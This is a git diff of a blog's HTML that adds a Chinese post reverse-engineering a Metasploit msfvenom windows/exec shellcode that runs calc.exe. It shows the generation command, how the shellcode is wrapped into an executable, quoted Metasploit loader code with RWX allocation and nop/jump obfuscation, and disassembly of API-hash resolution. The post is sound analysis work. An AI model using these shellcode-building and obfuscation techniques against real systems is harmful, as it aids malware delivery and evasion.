idqehxNOMPK/DxECHfkrKSd7Tsqd0gqhCJuodbf+v2Clkq1jBU8ix+SQApl1YCWYie9/jajUXsLnopIa2szQ1LRAISyoZbyQv3cFZ8e9UzJaJBi6eobl0hinvnMvamNTYLR7PcdljpsL03BZ1kDsQoqLlBcH9Z/kF4iJXI2ihb9BIs5zJ10sbjls6tSbOrJ9njXdXI8uxcmXGEWiXX94cnoPTx+CSPgNpFg3yIhSKYG5YJSOIZGJYDS9zZ3utnd7/j24x78waGQ5LhhQBpV+9gScRlj6ajfOGCdNALq3KjBcjYUSNHgAVPB7QUb6zQqu/RpQQcESFJAGTemVmgxYDLjUqxt2vDmxlKchnNZii/lsbo0LbWz4xQtSM6OYexAEYhfA4O5Phxl073kMCHC2Loy0UEXanjGLMqaC5rEwvmb2ZlEspllPHbcGo/4WPMCmfeDq7hGWKWxEF9Uo2BwQ7E7Mx7eLOoXpVWUY+fpgerhyTsjD8etdF//vLeNB+qUT4rZqQywdzFJhjQ2dvxrRREbQltKpe0GfoWhGxX4SzjyMtEM7QEyQEGoJyHOxrYD/+Mw9A0DAXUv1g/cTtujthQ1ohkLeGi+Y8GmG2moP5ggAfi2zzU2gz2UP/t/yYNHD1T1Am6BkWrIj0fJKMDBw7edt5V4n29Mq9GZW/PrfnwM9yHyChjffqrr+HwBDdoMNGFGYQwY3IwrhohpE+QxgtGQVdo1lCgTtVMtW+CEWHTxwGLX9PsNPiZhur4CRQJp4KhcDK3pTF+M7s8g+tpVTSCbA8zNpWK6ZMlRmPToeGnDxnWMt+lXlhyYM+/kmZqP8oDPnbuhBeWp1n7PcTWgUNSC2udPvj/+haFaRBXjcqmIeBZOC+I19JAWmtDb/44OKnnuSdWGhyKRy6joJsEYxgiY/vX8X8XLNR4inYjA4C/EggtNcvNrzsJnI1EGIInx7l+imUDyhtKOOcn8p5ZHVo0uxxVwiHBWTXu9mIeYs91md6pT3XXHlwqhRcVgRcTUPEPMaWkdecXLKyC27qSZ0xhwH6D+M8TyUcFRjoNS7kmSHRaHn906kecR0ZrlNpKKxW+Hm3/vYdSlmGufhwvtl9+u7BBcICNWyGfNIc+RI9l4GEazYgrYqB8SBZTo5E0jQcgLOa5lFzzA4mf4f2lzd0189ZlWmVrnues+nM57HwRnv6SVwJPPII1Z/ld9VObbfPtZsH6g75fXPuMbZlbdHhe41YmKQIqefLGWOuBkYynmm240SYdK2KwHJ/UXZH0RJq+/r0YlEVEt9f+VxP2XfE/IV+iA9LGT06DL9CURZ/qasTVUom1dUU74YzTzQAnhgjqSJdDd0/ftzF0IoNBtM5/plHLs42ekELEeDiXHvTBhufiTSGCMfTN9zofdVMRS2J77CVJ9QKcCsiJ0UeQWqT7+priY9g3iWu8DUYmizFDNPp0flk+89q6eea/a2kA/vPFyBruqH5zF8xKvO0lqUZhAmGmYctA0BSZRbbdA+GvPwcPbPb7Fg82CgH8aJY4Sra+GmIRBioGqVzSj4/AOdgBNuYsQ6jidjgb771YJdoakUH1nML89hmP3qzyDeVxwJnL8pbogZCzPpuWXQpi98J0kKwM3KGEzVr0/6FnEt6Au0nl17k3eaMhmkr/JqjI7bQQ/qfiA0hvQ1HG2QGJjQFxuKC8CeJprrx8bcIKUCqwYmLDarxcCtpLYm6c3OEiu6Iq+hCJwhXNhXOwkqp4ELwVukSu1ddilpDzAu0gIG+Cd1+vzjAuZppLCgfnAKDTQWbLfEhcf+qu7zSA1a6cZMjnHExNUna6N67pek8864DWBkgO3CPdVNvxsCqPtgGN+u8mH/8UxOFMIL0UYEEIxxQ3ABb8O4N+fNFJ2yxGISvy1k62NDg7pPcgom04zMWk18d+qt4fjrjrKvTTao8k0jszxjPAmAWbRZ5zR1nHJ9yvsmVKmEId7PTE1KAKDyZbDbeRGQjpnG8Pm23dkvzNIlzKW5+frQdzkALNAtl7zdwOW4IuNjQ+DIPGBX0oY1QkMDiuF4S43+ybJXeBGzCKY1lurmMD1rUKVRexaYWBpQVaoqXSBWi4tjQLI+W9RLgw7ZGpjPAfAU+PsLpV9D7t2Mb5sZM7xyiQgV6m6KF+OVMFF7Y1CfuM7YyrEUjrnJABasrjDAZ0lU4YT8suSmlPx3O9C4wC66GtT1dMKRse+Y1t9pYet5FAlsr6495oeoH7UzBb0vYl0YEnx7jqaIPJwMtVo1Bc7nWUw7P0IEq2vX7oOiyZDgrhBNXHZG3lf/7pYm0QZqoEPNmHXG5ZgN472xs6WcYmblWL68IyGWQjKxVtt1yu/6gh2/ut0E4DnsCEgo6NU1sxDbvPWeOMnKZd6YKdNRHNZK10fDASDOGSlehUYADoJXBdJ0W1ghs4ocJcMOrsH5/w9XopIBFfy1uvWg6yILqBZLPmZpORt6GOCrGJ++YAlaTcHJrwYEUCPjLNCksu4XQdnSrIRTDHUS2Ik7bGJ5jzbU0Nbj3k/5ECLAGvdLBhn7AFz5qo3JaSyy4ppjzTgZZrj7UtHihWfn7pl/W1QvfKLPaouQoLy/6EkNk5wdQghFc4d6RFacKT+8K4jGGrgOP5q+wg+btKR0U3PatCz/8/jcmbmV7P181RYA9rXz4AQOQLtzVwpMnJ8sPn5zT17hFzJogCHd9xJdUjIaqmuhxZ6ZJqUQSMhlbU6nEprhcXVgYOnd5/AbvCnZPegk0OhV39iKZ8xjL9orRbnMZ3f8Xzh4ontaDm4SNYj1d1/Rz6xqpMhrakzs16tVzr9NsuTWu8yGvxHMSQ0YQT1dFvzqtXjSjA31/z9WAGDmoblRo=
-</div>
-<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于之前就想分析msfvenom生成的payload。经过前后几次波折<br>第三次分析后才看懂了不少。</p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>1.msfvenom生成shellcode<br>ps:用x86更好的分析</p>
+<pre><code>msfvenom -p windows/exec cmd=calc.exe -f raw -o shellcode.bin
+</code></pre><p>2.将shellcode放入一个PE里<br>准备工具:</p>
+<ul>
+<li>yasm.exe</li>
+<li>GoLink.exe<br><img src="https://s3.ax1x.com/2021/02/19/yfWvJf.png" alt=""></li>
+</ul>
+<p>将shellcdoe.bin和shellcode.asm放在同一个目录<br>shellcode.asm</p>
+<pre><code class="asm">Global Start
+SECTION &#39;foo&#39; write,execute,read
+
+Start:
+incbin &quot;shellcode.bin&quot;
+</code></pre>
+<p>生成obj后在生成exe</p>
+<pre><code>yasm.win32.exe -f win32 -o shell.obj shellcode.asm
+Golink /ni /entry Start shell.obj
+</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yffFwn.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/02/19/yffkoq.png" alt=""></p>
+<p>3.利用IDA分析<br><img src="https://s3.ax1x.com/2021/02/19/yffZWT.png" alt=""></p>
+<p>loc_401088函数分析</p>
+<p>msf生成payload的模板对照分析<br><img src="https://s3.ax1x.com/2021/02/19/yff8Fx.png" alt=""><br>提一点:msf生成的shellcode模板对应的API是<code>hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )</code><br>计算公式：</p>
+<pre><code class="text">msf的windows API方法：
+DLL HASH+API HASH=HASH
+如果知道最终hash求对应的API名称，计算公式：HASH-DLL HASH=API HASH
+例如：
+kernel32.dll HASH-&gt;92AF16DA
+Winexec HASH-&gt;F4C07457
+
+x86截取最后8位
+最终hash位：92AF16DA+F4C07457=876F8B31
+得到hash反求API hash：876F8B31-92AF16DA=F4C07457
+对应API和DLL 的HASH参考:https://github.com/hidd3ncod3s/WindowsAPIhash
+</code></pre>
+<p><a href="https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803</a></p>
+<pre><code class="ruby">  def self.win32_rwx_exec_thread(code, block_offset, which_offset=&#39;start&#39;)
+    stub_block = Rex::Payloads::Shuffle.from_graphml_file(
+      File.join(Msf::Config.install_root, &#39;data&#39;, &#39;shellcode&#39;, &#39;block_api.x86.graphml&#39;),
+      arch: ARCH_X86,
+      name: &#39;api_call&#39;
+    )
+
+    stub_exit = %Q^
+    ; Input: EBP must be the address of &#39;api_call&#39;.
+    ; Output: None.
+    ; Clobbers: EAX, EBX, (ESP will also be modified)
+    ; Note: Execution is not expected to (successfully) continue past this block
+    exitfunk:
+      mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
+      push 0x9DBD95A6        ; hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )
+      call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
+      cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
+      jl goodbye       ; Then just call the exit function...
+      cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
+      jne goodbye      ;
+      mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
+    goodbye:                 ; We now perform the actual call to the exit function
+      push byte 0            ; push the exit function parameter
+      push ebx               ; push the hash of the exit function
+      call ebp               ; call EXITFUNK( 0 );
+    ^
+
+    stub_alloc = %Q^
+      pushad                 ; Save registers
+      cld                    ; Clear the direction flag.
+      call start             ; Call start, this pushes the address of &#39;api_call&#39; onto the stack.
+    delta:                   ;
+    #{stub_block}
+    start:                   ;
+      pop ebp                ; Pop off the address of &#39;api_call&#39; for calling later.
+    allocate_size:
+       mov esi,#{code.length}
+    allocate:
+      push byte 0x40         ; PAGE_EXECUTE_READWRITE
+      push 0x1000            ; MEM_COMMIT
+      push esi               ; Push the length value of the wrapped code block
+      push byte 0            ; NULL as we dont care where the allocation is.
+      push 0xE553A458        ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )
+      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+      mov ebx, eax           ; Store allocated address in ebx
+      mov edi, eax           ; Prepare EDI with the new address
+      mov ecx, esi           ; Prepare ECX with the length of the code
+      call get_payload
+    got_payload:
+      pop esi                ; Prepare ESI with the source to copy
+      rep movsb              ; Copy the payload to RWX memory
+      call set_handler       ; Configure error handling
+    exitblock:
+    #{stub_exit}
+    set_handler:
+      xor eax,eax
+;     push dword [fs:eax]
+;     mov dword [fs:eax], esp
+      push eax               ; LPDWORD lpThreadId (NULL)
+      push eax               ; DWORD dwCreationFlags (0)
+      push eax               ; LPVOID lpParameter (NULL)
+      push ebx               ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
+      push eax               ; SIZE_T dwStackSize (0 for default)
+      push eax               ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
+      push 0x160D6838        ; hash( &quot;kernel32.dll&quot;, &quot;CreateThread&quot; )
+      call ebp               ; Spawn payload thread
+      pop eax                ; Skip
+;     pop eax                ; Skip
+      pop eax                ; Skip
+      popad                  ; Get our registers back
+;     sub esp, 44            ; Move stack pointer back past the handler
+    ^
+
+    stub_final = %Q^
+    get_payload:
+      call got_payload
+    payload:
+    ; Append an arbitrary payload here
+    ^
+
+
+    stub_alloc.gsub!(&#39;short&#39;, &#39;&#39;)
+    stub_alloc.gsub!(&#39;byte&#39;, &#39;&#39;)
+
+    wrapper = &quot;&quot;
+    # regs    = %W{eax ebx ecx edx esi edi ebp}
+
+    cnt_jmp = 0
+    cnt_nop = 64
+
+    stub_alloc.each_line do |line|
+      line.gsub!(/;.*/, &#39;&#39;)
+      line.strip!
+      next if line.empty?
+
+      if cnt_nop &gt; 0 &amp;&amp; rand(4) == 0
+        wrapper &lt;&lt; &quot;nop\n&quot;
+        cnt_nop -= 1
+      end
+
+      if cnt_nop &gt; 0 &amp;&amp; rand(16) == 0
+        cnt_nop -= 2
+        cnt_jmp += 1
+
+        wrapper &lt;&lt; &quot;jmp autojump#{cnt_jmp}\n&quot;
+        1.upto(rand(8)+1) do
+          wrapper &lt;&lt; &quot;db 0x#{&quot;%.2x&quot; % rand(0x100)}\n&quot;
+          cnt_nop -= 1
+        end
+        wrapper &lt;&lt; &quot;autojump#{cnt_jmp}:\n&quot;
+      end
+      wrapper &lt;&lt; line + &quot;\n&quot;
+    end
+</code></pre>
+<p>start函数对应分析<br><img src="https://s3.ax1x.com/2021/02/19/yffqcF.png" alt=""></p>
+<p>由于静态call ebp这种找不到对应的地址，通过od来跟踪到loc_401088函数里的<code>call ebp</code><br>1.首先栈顶最上放出栈到ebp<br>2.然后push 1<br>3.在从堆栈里把calc.exe赋予到eax -&gt; lea eax,[ebp+0B2h]<br><img src="https://s3.ax1x.com/2021/02/19/yfhX28.png" alt=""><br>4.push eax，将calc.exe写入到堆栈<br>5.push Winexec对应的函数<br>6.然后call栈顶<br><img src="https://s3.ax1x.com/2021/02/19/yfhYEn.png" alt=""></p>
+<p>地址跳转到00401006地址<br><img src="https://s3.ax1x.com/2021/02/19/yfI5KU.png" alt=""></p>
+<p>PEB-&gt;Ldr-&gt;</p>
+<pre><code> mov     edx, fs:[eax+30h] ; 寻找PEB地址
+foo:0040100F                 mov     edx, [edx+0Ch]  ; PEB_LDR_DATA
+foo:00401012                 mov     edx, [edx+14h]  ; ModuleEntryPoint
+foo:00401015
+foo:00401015 loc_401015:                             ; CODE XREF: start+86↓j
+foo:00401015                 mov     esi, [edx+28h]  ; 遍历获取某些值的区段
+foo:00401018                 movzx   ecx, word ptr [edx+26h]
+ xor     edi, edi        ; 清空EDI寄存器
+ lodsb                   ; 将SI的存储值赋予AL
+foo:0040101E                                         ; mov eax,[esi]
+foo:0040101E                                         ; df=1;SI+1 else SI-1
+</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yf78DU.png" alt=""></p>
+<p>寻找对应API的函数</p>
+<pre><code>0040101E   &gt; /AC            lods byte ptr ds:[esi]
+0040101F   . |3C 61         cmp al,0x61
+00401021   . |7C 02         jl short shell.00401025
+00401023   . |2C 20         sub al,0x20
+00401025   &gt; |C1CF 0D       ror edi,0xD
+00401028   . |01C7          add edi,eax
+0040102A   .^\E2 F2         loopd short shell.0040101E
+0040102C   .  52            push edx
+0040102D   .  57            push edi
+0040102E   .  8B52 10       mov edx,dword ptr ds:[edx+0x10]          ;  shell.00400000
+00401031   .  8B4A 3C       mov ecx,dword ptr ds:[edx+0x3C]
+00401034   .  8B4C11 78     mov ecx,dword ptr ds:[ecx+edx+0x78]
+00401038   .  E3 48         jecxz short shell.00401082
+0040103A   .  01D1          add ecx,edx
+0040103C   .  51            push ecx
+0040103D   .  8B59 20       mov ebx,dword ptr ds:[ecx+0x20]
+00401040   .  01D3          add ebx,edx
+00401042   .  8B49 18       mov ecx,dword ptr ds:[ecx+0x18]
+00401045   &gt;  E3 3A         jecxz short shell.00401081
+00401047   .  49            dec ecx
+00401048   .  8B348B        mov esi,dword ptr ds:[ebx+ecx*4]
+0040104B   .  01D6          add esi,edx
+0040104D   .  31FF          xor edi,edi
+0040104F   &gt;  AC            lods byte ptr ds:[esi]
+00401050   .  C1CF 0D       ror edi,0xD
+00401053   .  01C7          add edi,eax
+00401055   .  38E0          cmp al,ah
+00401057   .^ 75 F6         jnz short shell.0040104F
+00401059   .  037D F8       add edi,dword ptr ss:[ebp-0x8]
+0040105C   .  3B7D 24       cmp edi,dword ptr ss:[ebp+0x24]
+0040105F   .^ 75 E4         jnz short shell.00401045
+</code></pre><p>最后得到的API函数地址赋于eax</p>
+<pre><code>00401075   .  894424 24     mov dword ptr ss:[esp+0x24],eax          ;  kernel32.WinExec
+</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yfbU6x.png" alt=""></p>
+<p>最后jmp eax对应的地址执行<br><img src="https://s3.ax1x.com/2021/02/19/yfbIAg.png" alt=""></p>
+<p>执行完WinExec函数后，执行GetVersion判断退出操作<br><img src="https://s3.ax1x.com/2021/02/19/yhnum6.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/02/19/yhnY6I.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/02/19/yhna0f.png" alt=""></p>
+<p>简写成一个过程：<br>PEB-&gt;ModuleEntryPoint-&gt;找到Kernel32.dll-&gt;WinExec-&gt;lea eax-&gt;call-&gt;Exit</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803</a><br><a href="https://www.anquanke.com/post/id/85386" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85386</a><br><a href="http://9b113d1a.blogspot.com/2017/03/les-hash-composite-couplemodulefunction.html" target="_blank" rel="noopener">http://9b113d1a.blogspot.com/2017/03/les-hash-composite-couplemodulefunction.html</a><br><a href="https://my.oschina.net/u/4593082/blog/4418768" target="_blank" rel="noopener">https://my.oschina.net/u/4593082/blog/4418768</a></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
@@ -1705,12 +1899,12 @@ U2FsdGVkX19liJ+kTWhLPeNdtDNj2T8mzRXlVnXxzCMw+nFUJIgmJ8JCXuZ+ojYQjueqcMzgYx5VC0iS
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Hack The Box - Traverxec</p>
+    <p><span class="copy-title">文章标题:</span>msfvenom生成的windows/exec shellcode分析</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-12-14, 23:46:21</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-15, 00:48:24</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/35f14d3d.html" title="Hack The Box - Traverxec">http://422926799.github.io/posts/35f14d3d.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-02-19, 12:40:56</p>
+    <p><span class="copy-title">最后更新:</span>2021-02-19, 16:46:15</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/c86ff70d.html" title="msfvenom生成的windows/exec shellcode分析">http://422926799.github.io/posts/c86ff70d.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
